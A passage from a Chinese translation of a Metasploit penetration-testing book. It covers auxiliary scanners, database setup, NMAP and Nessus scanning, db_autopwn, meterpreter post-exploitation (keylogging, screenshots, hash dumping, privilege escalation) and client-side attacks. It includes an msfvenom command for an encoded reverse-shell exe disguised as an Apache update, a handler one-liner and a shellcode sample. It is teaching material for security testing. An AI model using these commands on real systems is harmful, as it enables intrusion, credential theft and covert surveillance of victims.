+   +   **RHOSTS**：目标的 IP 地址或 IP 范围

我们可以在以下截图中看到这个辅助模块：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/32e2c16b-e57f-4bd5-bf35-fb371b53cb37.jpg)

+   `detect_kippo`：Kippo 是一个基于 SSH 的蜜罐，专门设计用来诱捕潜在的攻击者。这个辅助模块探测目标 SSH 服务器，以便检测它是一个真正的 SSH 服务器还是一个 Kippo 蜜罐。如果目标被检测到在运行 Kippo 蜜罐，那么进一步妥协它就没有意义了。

它的辅助模块名称是`auxiliary/scanner/ssh/detect_kippo`，您将需要配置以下参数：

+   +   **RHOSTS**：目标的 IP 地址或 IP 范围

我们可以在以下截图中看到这个辅助模块：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/d7bfacc2-9827-45d5-9110-4d7a37b74af2.jpg)

# 域名系统

**域名系统**（**DNS**）负责将主机名转换为相应的 IP 地址。DNS 通常在 UDP 端口 53 上工作，但也可以在 TCP 上运行。这个辅助模块可以用来从目标 DNS 服务器提取名称服务器和邮件记录信息。

它的辅助模块名称是`auxiliary/gather/dns_info`，您将需要配置以下参数：

+   **DOMAIN**：要扫描的目标域名

我们可以在以下截图中看到这个辅助模块：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/6dc0bdee-e99d-4717-8768-f3ba1b1ba2a6.jpg)

# 远程桌面协议

**远程桌面协议**（**RDP**）用于远程连接到 Windows 系统。RDP 使用 TCP 端口 3389 进行通信。这个辅助模块检查目标系统是否对 MS12-020 漏洞存在漏洞。MS12-020 是 Windows 远程桌面的一个漏洞，允许攻击者远程执行任意代码。有关 MS12-020 漏洞的更多信息可以在[`technet.microsoft.com/en-us/library/security/ms12-020.aspx`](https://technet.microsoft.com/en-us/library/security/ms12-020.aspx)找到。

它的辅助模块名称是`auxiliary/scanner/rdp/ms12_020`，您将需要配置以下参数：

+   **RHOSTS**：目标的 IP 地址或 IP 范围

我们可以在以下截图中看到这个辅助模块：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/2428466c-a2d4-46ac-b987-0f309ac579d3.jpg)

# 密码嗅探

密码嗅探是一种特殊类型的辅助模块，它监听网络接口，查找通过各种协议发送的密码，如 FTP、IMAP、POP3 和 SMB。它还提供了一个选项，可以导入以前转储的以`.pcap`格式的网络流量，并在其中查找凭据。

它的辅助模块名称是`auxiliary/sniffer/psnuffle`，可以在以下截图中看到：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/0afba3a1-e448-4cde-b065-9fb2842c1de5.jpg)

# 使用 Shodan 进行高级搜索

Shodan 是一个高级搜索引擎，用于搜索互联网连接的设备，如网络摄像头和 SCADA 系统。它还可以有效地用于搜索易受攻击的系统。有趣的是，Metasploit 框架可以与 Shodan 集成，直接从 msfconsole 发出搜索查询。

为了将 Shodan 与 Metasploit Framework 集成，您首先需要在[`www.shodan.io`](https://www.shodan.io)上注册。注册后，您可以从以下显示的“账户概述”部分获取 API 密钥：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/196365fb-8d37-4cb2-85ff-03e43c6afe0c.jpg)

其辅助模块名称是`auxiliary/gather/shodan_search`，该辅助模块连接到 Shodan 搜索引擎，从`msfconsole`发出搜索查询并获取搜索结果。

您将需要配置以下参数：

+   **SHODAN_APIKEY**：注册 Shodan 用户可用的 Shodan API 密钥

+   **QUERY**：要搜索的关键词

您可以运行`shodan_search`命令来获得以下结果：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/3a8fbdb6-0685-43f2-b528-880e3b47a1de.jpg)

# 总结

在本章中，我们已经看到了如何使用 Metasploit Framework 中的各种辅助模块进行信息收集和枚举。在下一章中，我们将学习如何对目标系统进行详细的漏洞评估。

# 练习

您可以尝试以下练习：

+   除了本章讨论的辅助模块外，尝试探索和执行以下辅助模块：

+   `auxiliary/scanner/http/ssl_version`

+   `auxiliary/scanner/ssl/openssl_heartbleed`

+   `auxiliary/scanner/snmp/snmp_enum`

+   `auxiliary/scanner/snmp/snmp_enumshares`

+   `auxiliary/scanner/snmp/snmp_enumusers`

+   使用 Shodan 辅助模块查找各种互联网连接设备


# 第五章：使用 Metasploit 进行漏洞搜索

在上一章中，您学习了各种信息收集和枚举技术。现在我们已经收集了有关目标系统的信息，是时候检查目标系统是否存在漏洞，以及我们是否可以在现实中利用它了。在本章中，我们将涵盖以下主题：

+   设置 Metasploit 数据库

+   漏洞扫描和利用

+   在 Metasploit 内执行 NMAP 和 Nessus 扫描

+   使用 Metasploit 辅助工具进行漏洞检测

+   使用`db_autopwn`进行自动利用

+   探索 Metasploit 的后渗透能力

# 管理数据库

到目前为止，我们已经看到，Metasploit Framework 是各种工具、实用程序和脚本的紧密集合，可用于执行复杂的渗透测试任务。在执行此类任务时，以某种形式生成了大量数据。从框架的角度来看，安全地存储所有数据以便在需要时有效地重用是至关重要的。默认情况下，Metasploit Framework 使用后端的 PostgreSQL 数据库来存储和检索所有所需的信息。

现在我们将看到如何与数据库交互执行一些琐碎的任务，并确保数据库在开始渗透测试活动之前已正确设置。

对于初始设置，我们将使用以下命令设置数据库：

```
root@kali :~# service postgresql start
```

这个命令将在 Kali Linux 上启动 PostgreSQL 数据库服务。在使用`msfconsole`命令之前，这是必要的：

```
root@kali :~# msfdb init 
```

这个命令将启动 Metasploit Framework 数据库实例，这是一次性的活动：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/173e3333-c162-4afe-b67c-ee236704465c.jpg)

`db_status`：一旦我们启动了 PostgreSQL 服务并初始化了`msfdb`，我们就可以开始使用`msfconsole`：

```
msf> db_status
```

`db_status`命令将告诉我们后端数据库是否已成功初始化并与`msfconsole`连接：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/31e64658-3faf-4e47-8c13-f637cc7a05e4.png)

# 工作空间

假设您同时为不同客户的多个渗透测试任务工作。您肯定不希望来自不同客户的数据混在一起。理想的方式是为每个任务创建逻辑隔间来存储数据。Metasploit Framework 中的工作空间帮助我们实现这一目标。

以下表格显示了与管理工作空间相关的一些常用命令：

| **Sr. no.** | **Command** | **Purpose** |
| --- | --- | --- |
| 1. | `workspace` | 这将列出在 Metasploit Framework 中先前创建的所有工作空间 |
| 2. | `workspace -h` | 这将列出与`workspace`命令相关的所有开关的帮助信息 |
| 3. | `workspace -a <name>` | 这将创建一个具有指定`name`的新工作空间 |
| 4. | `workspace -d <name>` | 这将删除指定的工作空间 |
| 5. | `workspace <name>` | 这将切换工作空间的上下文到指定的名称 |

以下截图显示了`workspace`命令与各种开关的用法：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/d4d13bf6-98d9-41df-b630-f77fa5235dcd.jpg)

# 导入扫描

我们已经知道 Metasploit Framework 有多么多才多艺，以及它与其他工具的良好集成。Metasploit Framework 提供了一个非常有用的功能，可以从其他工具（如 NMAP 和 Nessus）导入扫描结果。如下截图所示，`db_import`命令可用于将扫描导入 Metasploit Framework：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/4205f333-e060-4ca0-bc5d-3572e047feb1.jpg)

+   `hosts`命令：我们很可能已经对整个子网进行了 NMAP 扫描，并将扫描结果导入了 Metasploit Framework 数据库。现在，我们需要检查在扫描期间发现了哪些主机是活动的。如下截图所示，`hosts`命令列出了在扫描和导入期间发现的所有主机：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/179f098f-5ba5-4cbc-937f-d4e59fd7b863.jpg)

+   `services`命令：一旦 NMAP 扫描结果被导入数据库，我们可以查询数据库，过滤出我们可能感兴趣的服务。`services`命令带有适当的参数，如下截图所示，查询数据库并过滤服务：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/6f7a171f-8eeb-49e3-a8ff-1c22df85f078.jpg)

# 备份数据库

想象一下，您在使用 Metasploit 框架进行复杂的渗透测试任务上工作了很长时间。现在，由于某种不幸的原因，您的 Metasploit 实例崩溃了，无法启动。如果需要从头开始在新的 Metasploit 实例上重新工作，那将是非常痛苦的！这就是 Metasploit 框架中备份选项发挥作用的地方。`db_export`命令，如下截图所示，将数据库中的所有数据导出到外部 XML 文件中。

然后，您可以将导出的 XML 文件安全地保存起来，以防以后需要恢复数据：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/79480a42-ed1d-4bbe-8868-7373474bfc7e.jpg)

# NMAP

NMAP，即网络映射器的缩写，是一个非常先进的工具，可用于以下目的：

+   主机发现

+   服务检测

+   版本枚举

+   漏洞扫描

+   防火墙测试和规避

NMAP 是一个有数百个参数可配置的工具，完全覆盖它超出了本书的范围。然而，以下表格将帮助您了解一些最常用的 NMAP 开关：

| **序号** | **NMAP 开关** | **目的** |
| --- | --- | --- |
| 1. | `-sT` | 执行连接（TCP）扫描 |
| 2. | `-sU` | 执行扫描以检测开放的 UDP 端口 |
| 3. | `-sP` | 执行简单的 ping 扫描 |
| 4. | `-A` | 执行侵略性扫描（包括隐秘 syn 扫描和 OS 和版本检测加上路由跟踪和脚本） |
| 5. | `-sV` | 执行服务版本检测 |
| 6. | `-v` | 打印详细输出 |
| 7. | `-p 1-1000` | 仅扫描 1 到 1000 范围内的端口 |
| 8. | `-O` | 执行操作系统检测 |
| 9. | `-iL <filename>` | 从指定的`<filename>`文件中扫描所有主机 |
| 10. | `-oX` | 以 XML 格式输出扫描结果 |
| 11. | `-oG` | 以可 grep 格式输出扫描结果 |
| 12. | `--script <script_name>` | 对目标执行指定的脚本 `<script_name>` |

例如：`nmap -sT -sV -O 192.168.44.129 -oX /root/Desktop/scan.xml`。

上述命令将在 IP 地址`192.168.44.129`上执行连接扫描，检测所有服务的版本，识别目标正在运行的操作系统，并将结果保存到路径`/root/Desktop/scan.xml`的 XML 文件中。

# NMAP 扫描方法

我们已经在前一节中看到，Metasploit 框架提供了从 NMAP 和 Nessus 等工具导入扫描的功能。然而，还有一个选项可以从 Metasploit 框架内启动 NMAP 扫描。这将立即将扫描结果存储在后端数据库中。

然而，这两种方法之间并没有太大的区别，只是个人选择的问题。

+   从`msfconsole`扫描：`db_nmap`命令，如下截图所示，从 Metasploit 框架内启动 NMAP 扫描。扫描完成后，您可以简单地使用`hosts`命令列出扫描的目标。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/eaeaab1f-9896-4d45-bc3b-921389569882.jpg)

# Nessus

Nessus 是一个流行的漏洞评估工具，我们在第一章中已经见过了，*Metasploit 和支持工具简介*。现在，有两种使用 Nessus 与 Metasploit 的替代方法，如下所示：

+   对目标系统执行 Nessus 扫描，保存报告，然后使用`db_import`命令将其导入 Metasploit 框架，如本章前面讨论的那样

+   加载、启动并触发目标系统上的 Nessus 扫描，直接通过`msfconsole`描述在下一节中

# 使用 msfconsole 从 Nessus 进行扫描

在使用 Nessus 开始新的扫描之前，重要的是在`msfconsole`中加载 Nessus 插件。加载插件后，可以使用一对凭据连接到您的 Nessus 实例，如下一张截图所示。

在`msfconsole`中加载`nessus`之前，请确保使用`/etc/init.d/nessusd start`命令启动 Nessus 守护程序。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/5de6d82b-e261-47e9-aaf1-8219516e1c7e.jpg)

一旦加载了`nessus`插件，并且我们连接到了`nessus`服务，我们需要选择要使用哪个策略来扫描我们的目标系统。可以使用以下命令执行此操作：

```
msf> nessus_policy_list -
msf> nessus_scan_new <Policy_UUID>
msf> nessus_scan_launch <Scan ID>
```

您也可以在以下截图中看到这一点：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/343309fc-1f37-40dd-adb1-49aa0993c8f3.jpg)

一段时间后，扫描完成，可以使用以下命令查看扫描结果：

```
msf> nessus_report_vulns <Scan ID>
```

您也可以在以下截图中看到这一点：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/0692bbce-7b41-4a3f-93d8-870433031aae.jpg)

# 使用 Metasploit 辅助模块进行漏洞检测

在上一章中，我们已经看到了各种辅助模块。Metasploit 框架中的一些辅助模块也可以用于检测特定的漏洞。例如，以下截图显示了用于检查目标系统是否容易受到 MS12-020 RDP 漏洞影响的辅助模块：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/47cd1964-0a1b-4b72-a71b-e4843a07da9c.jpg)

# 使用 db_autopwn 进行自动利用

在上一节中，我们已经看到了 Metasploit 框架如何帮助我们从其他各种工具（如 NMAP 和 Nessus）导入扫描结果。现在，一旦我们将扫描结果导入数据库，下一个逻辑步骤将是查找与导入扫描的漏洞/端口匹配的利用。我们当然可以手动执行此操作；例如，如果我们的目标是 Windows XP，并且它打开了 TCP 端口 445，那么我们可以尝试针对其执行`MS08_67 netapi`漏洞。

Metasploit 框架提供了一个名为`db_autopwn`的脚本，它自动化了利用匹配过程，如果找到匹配项，则执行适当的利用，并给我们远程 shell。但是，在尝试此脚本之前，需要考虑以下几点：

+   `db_autopwn`脚本已经正式从 Metasploit 框架中弃用。您需要明确下载并将其添加到您的 Metasploit 实例中。

+   这是一个非常资源密集的脚本，因为它尝试针对目标的所有漏洞的排列和组合，因此会产生很多噪音。

+   这个脚本不再建议用于针对任何生产系统的专业使用；但是，从学习的角度来看，您可以在实验室中针对任何测试机器运行它。

以下是开始使用`db_autopwn`脚本的步骤：

1.  打开一个终端窗口，并运行以下命令：

```
wget https://raw.githubusercontent.com
/jeffbryner/kinectasploit/master/db_autopwn.rb
```

1.  将下载的文件复制到`/usr/share/metasploit-framework/plugins`目录中。

1.  重新启动`msfconsole`。

1.  在`msfconsole`中，输入以下代码：

```
msf> use db_autopwn
```

1.  使用以下命令列出匹配的利用：

```
msf> db_autopwn -p -t
```

1.  使用以下命令利用匹配的利用：

```
 msf> db_autopwn -p -t -e
```

# 后渗透

后渗透是渗透测试中的一个阶段，在这个阶段我们已经对目标系统有了有限（或完全）的访问权限，现在，我们想要搜索特定的文件、文件夹，转储用户凭据，远程捕获屏幕截图，从远程系统中转储按键，提升权限（如果需要），并尝试使我们的访问持久化。在本节中，我们将学习 meterpreter，它是一个以其功能丰富的后渗透能力而闻名的高级有效载荷。

# 什么是 meterpreter？

Meterpreter 是一个高级的可扩展有效载荷，它使用*内存* DLL 注入。它显著增加了 Metasploit 框架的后渗透能力。通过在分段套接字上通信，它提供了一个广泛的客户端端 Ruby API。Meterpreter 的一些显着特点如下：

+   **隐秘**：Meterpreter 完全驻留在受损系统的内存中，并且不会向磁盘写入任何内容。它不会产生任何新进程；它会将自身注入到受损进程中。它有能力轻松迁移到其他运行的进程。默认情况下，Meterpreter 通过加密通道进行通信。这在法医角度上对受损系统留下了有限的痕迹。

+   **可扩展**：功能可以在运行时添加，并直接通过网络加载。新功能可以添加到 Meterpreter 而无需重新构建它。`meterpreter`有效载荷运行无缝且非常快速。

下面的截图显示了我们通过利用我们的 Windows XP 目标系统上的`ms08_067_netapi`漏洞获得的`meterpreter`会话。

在使用漏洞之前，我们需要通过发出`use payload/windows/meterpreter/reverse_tcp`命令来配置 meterpreter 有效载荷，然后设置 LHOST 变量的值。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/60d8c76a-0333-43c5-898f-f848a9c9ba56.jpg)

# 搜索内容

一旦我们攻破了目标系统，我们可能想要寻找特定的文件和文件夹。这完全取决于渗透测试的上下文和意图。meterpreter 提供了一个搜索选项，可以在受损的系统上查找文件和文件夹。下面的截图显示了一个搜索查询，寻找位于 C 驱动器上的机密文本文件：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/760e89f7-1f8a-4fd7-8379-0f3dbf2a3440.jpg)

# 屏幕截图

成功攻破后，我们可能想知道在受损系统上运行的活动和任务。拍摄屏幕截图可能会给我们一些有趣的信息，了解我们的受害者在那个特定时刻在做什么。为了远程捕获受损系统的屏幕截图，我们执行以下步骤：

1.  使用`ps`命令列出目标系统上运行的所有进程以及它们的 PID。

1.  定位`explorer.exe`进程，并记下其 PID。

1.  将 meterpreter 迁移到`explorer.exe`进程，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/23ff19d1-d7d9-4bf4-92fb-1e541814f3fa.jpg)

一旦我们将 meterpreter 迁移到`explorer.exe`，我们加载`espia`插件，然后执行`screengrab`命令，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/fa71e2ae-e011-494d-aa93-1abbcbd9ca66.jpg)

我们的受损系统的屏幕截图已保存（如下所示），我们可以注意到受害者正在与 FileZilla Server 进行交互：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/e51dde33-39ec-4471-861d-f419819645cd.jpeg)

# 按键记录

除了屏幕截图，另一个非常有用的 meterpreter 功能是键盘记录。meterpreter 按键记录器将捕获在受损系统上按下的所有按键，并将结果转储到我们的控制台上。使用`keyscan_start`命令在受损系统上启动远程键盘记录，而使用`keyscan_dump`命令将所有捕获的按键转储到 Metasploit 控制台上：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/08e5b51d-944f-4646-84f8-447fc5a64443.jpg)

# 转储哈希并使用 JTR 破解

Windows 将用户凭据以加密格式存储在其 SAM 数据库中。一旦我们已经攻破了目标系统，我们就想获取该系统上的所有凭据。如下截图所示，我们可以使用`post/windows/gather/hashdump`辅助模块从远程受损系统中转储密码哈希：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/7192bbac-1e83-4dbb-810c-025364351ec5.jpg)

一旦我们有了凭据的转储，下一步就是破解它们并检索明文密码。Metasploit Framework 有一个辅助模块`auxiliary/analyze/jtr_crack_fast`，可以触发对转储哈希的密码破解。

完成后，模块会显示明文密码，如下截图所示：

**jtr**是**John the Ripper**的缩写，是最常用的密码破解工具。![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/c90dbc0e-d442-4c43-81df-2f7b1ebb5e09.jpg)

# Shell 命令

一旦我们成功利用了漏洞并获得了 meterpreter 访问，我们可以使用`shell`命令来获得对受损系统的命令提示符访问（如下截图所示）。命令提示符访问会让您感觉自己就像在物理上操作目标系统一样：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/f5bc0152-5805-4f0f-bc1b-d67c3f30ad25.jpg)

# 特权提升

我们可以利用漏洞并获得远程 meterpreter 访问，但很可能我们在受损系统上的权限受到限制。为了确保我们对受损系统拥有完全访问和控制权，我们需要将特权提升到管理员级别。meterpreter 提供了提升特权的功能，如下截图所示。首先，我们加载一个名为`priv`的扩展，然后使用`getsystem`命令来提升特权。

然后，我们可以使用`getuid`命令验证我们的特权级别：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/cc441871-c94c-4193-b515-7f2953eb99d8.jpg)

# 摘要

在本章中，您学习了如何设置 Metasploit 数据库，然后探索了使用 NMAP 和 Nessus 进行漏洞扫描的各种技术。我们最后了解了 Metasploit Framework 的高级后渗透功能。在下一章中，我们将学习 Metasploit Framework 的有趣的客户端利用功能。

# 练习

您可以尝试以下练习：

+   找出并尝试使用任何可用于漏洞检测的辅助模块

+   尝试探索 meterpreter 的各种功能，而不是本章讨论的那些功能

+   尝试找出是否有替代`db_autopwn`


# 第六章：使用 Metasploit 进行客户端攻击

在上一章中，我们学习了如何使用各种工具，如 NMAP 和 Nessus，直接利用目标系统中的漏洞。然而，我们学到的技术只有在攻击者的系统和目标系统在同一网络中时才有用。在本章中，我们将概述用于利用完全位于不同网络中的系统的技术。本章将涵盖以下主题：

+   理解与客户端攻击相关的关键术语

+   使用 msfvenom 生成自定义有效载荷

+   使用社会工程工具包

+   使用`browser_autopwn`辅助模块进行高级基于浏览器的攻击

# 客户端攻击的需求

在上一章中，我们在目标系统中使用了 MS08_067net api 漏洞，并获得了对系统的完全管理员级访问权限。我们将 RHOST 变量的值配置为目标系统的 IP 地址。现在，只有在攻击者的系统和目标系统都在同一网络中时，攻击才会成功。（攻击者系统的 IP 地址为`192.168.44.134`，目标系统的 IP 地址为`192.168.44.129`）。

如下图所示，这种情况非常直接：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/111651aa-ff4e-4af5-bd7d-8135a10fa6cd.jpg)

现在，考虑下面图中显示的情景。攻击者系统的 IP 地址是一个*公共*地址，他试图利用不在同一网络中的系统上的漏洞。请注意，目标系统在这种情况下具有私有 IP 地址（`10.11.1.56`）并且在互联网路由器（`88.43.21.9x`）后进行了 NAT。因此，攻击者的系统和目标系统之间没有直接的连接。通过将 RHOST 设置为`89.43.21.9`，攻击者只能到达互联网路由器，而无法到达所需的目标系统。在这种情况下，我们需要采用另一种攻击目标系统的方法，即客户端攻击：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/7aade532-9f47-47be-98f0-bd7da899ecfd.jpg)

# 什么是客户端攻击？

正如我们在前面的部分中看到的，如果目标系统不在攻击者的网络中，那么攻击者无法直接到达目标系统。在这种情况下，攻击者将不得不通过其他方式将有效载荷发送到目标系统。将有效载荷传递到目标系统的一些技术包括：

1.  攻击者托管一个包含所需恶意有效载荷的网站，并将其发送给受害者。

1.  攻击者将有效载荷嵌入到任何看似无害的文件中，如 DOC、PDF 或 XLS，并通过电子邮件发送给受害者。

1.  攻击者使用感染的媒体驱动器（如 USB 闪存驱动器、CD 或 DVD）发送有效载荷

现在，一旦有效载荷被发送到受害者，受害者需要执行所需的操作以触发有效载荷。一旦有效载荷被触发，它将连接到攻击者并为他提供所需的访问权限。大多数客户端攻击需要受害者执行某种操作或其他。

以下流程图总结了客户端攻击的工作原理：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/a115f914-bbe2-40c8-bec1-a6bd3a300dda.jpg)

# 什么是 Shellcode？

让我们把单词 shellcode 分解成 shell 和 code。简单来说，shellcode 是一种旨在给目标系统提供 shell 访问权限的代码。实际上，shellcode 可以做的远不止提供 shell 访问权限。这完全取决于 shellcode 中定义的操作。为了执行客户端攻击，我们需要选择精确的 shellcode 作为有效载荷的一部分。假设目标系统存在某种漏洞，攻击者可以编写一个 shellcode 来利用该漏洞。Shellcode 通常是十六进制编码的数据，可能看起来像这样：

```
"
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2"
 "\x51\x68\x6c\x6c\x20\x20\x68\x33"
 "\x32\x2e\x64\x68\x75\x73\x65\x72"
 "\x89\xe1\xbb\x7b\x1d\x80\x7c\x51"
 "\xff\xd3\xb9\x5e\x67\x30\xef\x81"
 "\xc1\x11\x11\x11\x11\x51\x68\x61"
 "\x67\x65\x42\x68\x4d\x65\x73\x73"
 "\x89\xe1\x51\x50\xbb\x40\xae\x80"
 "\x7c\xff\xd3\x89\xe1\x31\xd2\x52"
 "\x51\x51\x52\xff\xd0\x31\xc0\x50"
 "\xb8\x12\xcb\x81\x7c\xff\xd0" 
"
```

# 什么是反向 Shell？

反向 shell 是一种 shell 类型，执行后会连接到攻击者的系统，提供 shell 访问权限。

# 什么是绑定 shell？

绑定 shell 是一种 shell 类型，执行时会主动监听特定端口上的连接。攻击者可以连接到该端口以获取 shell 访问权限。

# 什么是编码器？

`msfvenom`实用程序将为我们生成有效载荷。然而，我们的有效载荷在目标系统上被杀毒软件检测到的可能性非常高。几乎所有行业领先的杀毒软件和安全软件程序都有签名来检测 Metasploit 有效载荷。如果我们的有效载荷被检测到，它将变得无用，我们的利用将失败。这正是编码器发挥作用的地方。编码器的工作是以一种不被杀毒软件或类似安全软件程序检测到的方式对生成的有效载荷进行混淆。

# msfvenom 实用程序

早些时候，Metasploit 框架提供了两个不同的实用程序，即`msfpayload`和`msfencode`。`msfpayload`用于生成指定格式的有效载荷，而`msfencode`用于使用各种算法对有效载荷进行编码和混淆。然而，Metasploit 框架的更新和最新版本将这两个实用程序合并为一个称为`msfvenom`的单一实用程序。

`msfvenom`实用程序可以在单个命令中生成有效载荷并对其进行编码。接下来我们将看到一些命令：

`msfvenom`是一个独立的实用程序，不需要同时运行`msfconsole`。

+   **列出有效载荷**：`msfvenom`实用程序支持所有标准的 Metasploit 有效载荷。我们可以使用`msfvenom --list payloads`命令列出所有可用的有效载荷，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/9f513895-004b-446b-9de3-5d7c50cdf0b9.jpg)

+   **列出编码器**：正如我们之前讨论的，`msfvenom`是一个单一的实用程序，可以生成以及编码有效载荷。它支持所有标准的 Metasploit 编码器。我们可以使用`msfvenom --list encoders`命令列出所有可用的编码器，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/c44fc94e-1cd6-47fd-aca5-51b2955c80e9.jpg)

+   **列出格式**：在生成有效载荷时，我们需要指示`msfvenom`实用程序我们需要将有效载荷生成为的文件格式。我们可以使用`msfvenom --help formats`命令查看所有支持的有效载荷输出格式：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/c1c55766-20fc-40f8-8ba5-8e3b051ae4b4.jpg)

+   **列出平台**：在生成有效载荷的同时，我们还需要指示`msfvenom`实用程序我们的有效载荷将在哪个平台上运行。我们可以使用`msfvenom --help-platforms`命令列出所有支持的平台：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/a6c5332a-9617-4eb9-b1f4-c763371307d7.jpg)

# 使用 msfvenom 生成有效载荷

现在我们已经熟悉了`msfvenom`实用程序支持的所有有效载荷、编码器、格式和平台，让我们尝试生成一个示例有效载荷，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/9014fdb6-b1c9-4c40-a5fd-50ed1cd45567.jpg)

以下表格显示了在前述`msfvenom`命令中使用的每个命令开关的详细说明：

| **开关** | **说明** |
| --- | --- |
| `-a x86` | 这里，生成的有效载荷将在 x86 架构上运行 |
| `--platform windows` | 这里，生成的有效载荷针对 Windows 平台 |
| `-p windows/meterpreter/reverse_tcp` | 这里，有效载荷是带有反向 TCP 的 meterpreter |
| `LHOST= 192.168.44.134` | 这里，攻击者系统的 IP 地址是`192.168.44.134` |
| `LPORT= 8080` | 这里，攻击者系统上监听的端口号是`8080` |
| `-e x86/shikata_ga_nai` | 这里，要使用的有效载荷编码器是`shikata_ga_nai` |
| `-f exe` | 这里，有效载荷的输出格式是`exe` |
| `-o /root/Desktop/apache-update.exe` | 这是生成的有效载荷将保存的路径 |

一旦我们生成了一个载荷，我们需要设置一个监听器，一旦在目标系统上执行了载荷，它将接受反向连接。以下命令将在 IP 地址`192.168.44.134`上的端口`8080`上启动一个 meterpreter 监听器：

```
msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.44.134; set LPORT 8080; run; exit -y"
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/61aaa5da-67dc-4c3f-999a-ebce60a4f57f.jpg)

现在，我们已将载荷伪装成 Apache 更新发送给了我们的受害者。受害者需要执行它以完成利用：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/121c0525-b774-4a16-8fa2-cf66752a7b32.jpg)

一旦受害者执行`apache-update.exe`文件，我们就会在之前设置的监听器上获得一个活动的 meterpreter 会话（如下截图所示）：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/50a1691c-8d07-4e05-b63c-7b9c0e93b3eb.jpg)

另一种有趣的载荷格式是 VBA。如下截图所示，以 VBA 格式生成的载荷可以嵌入到任何 Word/Excel 文档的宏中：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/b6ede9c5-6ac3-412b-8ec6-555cd440e498.jpg)

# 使用 Metasploit 进行社会工程

社会工程是一种操纵人类行为的艺术，以绕过目标系统的安全控制。让我们以一个遵循非常严格安全实践的组织为例。所有系统都经过了加固和修补。最新的安全软件已部署。从技术上讲，攻击者很难找到并利用任何漏洞。然而，攻击者以某种方式设法与该组织的网络管理员交友，然后欺骗他透露管理员凭据。这是一个经典的例子，人类始终是安全链中最薄弱的环节。

默认情况下，Kali Linux 具有一个强大的社会工程工具，可以与 Metasploit 无缝集成，以发动有针对性的攻击。在 Kali Linux 中，社会工程工具包位于 Exploitation Tools | Social Engineering Toolkit 下。

# 生成恶意 PDF

打开社会工程工具包，并选择第一个选项 Spear-Phishing Attack Vectors，如下截图所示。然后选择第二个选项 Create a File Format Payload：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/4141fff5-60fe-42f7-8991-dc871b8368d1.jpg)

现在，选择选项 14 使用`Adobe util.printf() Buffer Overflow`利用：

